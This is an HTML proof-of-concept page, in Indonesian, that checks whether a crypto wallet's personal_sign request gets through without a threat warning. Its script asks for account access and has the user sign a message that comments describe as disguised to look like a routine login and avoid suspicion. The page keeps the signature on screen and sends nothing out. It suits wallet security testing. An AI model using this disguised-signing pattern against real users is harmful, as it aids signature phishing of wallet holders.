<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Sign Security Sandbox</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 90vh;
        }
        .card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 24px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 {
            margin-top: 0;
            font-size: 1.25rem;
            color: #38bdf8;
        }
        p {
            font-size: 0.9rem;
            color: #94a3b8;
        }
        .btn {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: background 0.2s;
        }
        .btn:active {
            background-color: #1d4ed8;
        }
        .status-box {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            background-color: #0f172a;
            border: 1px solid #475569;
            font-family: monospace;
            font-size: 0.85rem;
            color: #cbd5e1;
            word-break: break-all;
        }
        .success { color: #4ade80; border-color: #166534; }
        .error { color: #f87171; border-color: #991b1b; }
    </style>
</head>
<body>

<div class="card">
    <h2>Web3 Sign Validation PoC</h2>
    <p>Uji Coba Penandatanganan Pesan (personal_sign)</p>

    <button class="btn" id="exploitBtn">Uji personal_sign Otomatis</button>
    
    <div id="statusBox" class="status-box">Status: Menunggu interaksi pemicu...</div>
</div>

<script>
    const statusBox = document.getElementById('statusBox');

    function updateStatus(text, type = '') {
        statusBox.innerText = text;
        statusBox.className = 'status-box ' + type;
    }

    async function executeSignPoC() {
        try {
            updateStatus("Memeriksa provider ethereum...", "");

            let provider = window.ethereum;
            if (!provider && window.web3 && window.web3.currentProvider) {
                provider = window.web3.currentProvider;
            }

            if (!provider) {
                updateStatus("Error: Provider tidak ditemukan di WebView.", "error");
                return;
            }

            updateStatus("Meminta koneksi akun...", "");
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // Payload pesan yang disamarkan agar terlihat seperti verifikasi login biasa (menghindari kecurigaan UI warning)
            const message = "Verifikasi Sesi Keamanan DApp: Masuklah untuk melanjutkan sinkronisasi dompet aman.";
            const msgHex = "0x" + Array.from(new TextEncoder().encode(message))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');

            updateStatus("Mengirim request personal_sign...", "");

            // Menguji apakah personal_sign lolos dari peringatan ancaman merah
            const signature = await provider.request({
                method: 'personal_sign',
                params: [msgHex, accounts[0]],
            });

            updateStatus("Berhasil Ditandatangani! Sig: " + signature.substring(0, 15) + "...", "success");

        } catch (error) {
            updateStatus("Ditolak/Gagal: " + (error.message || error), "error");
            console.error(error);
        }
    }

    document.getElementById('exploitBtn').addEventListener('click', executeSignPoC);
</script>

</body>
</html>
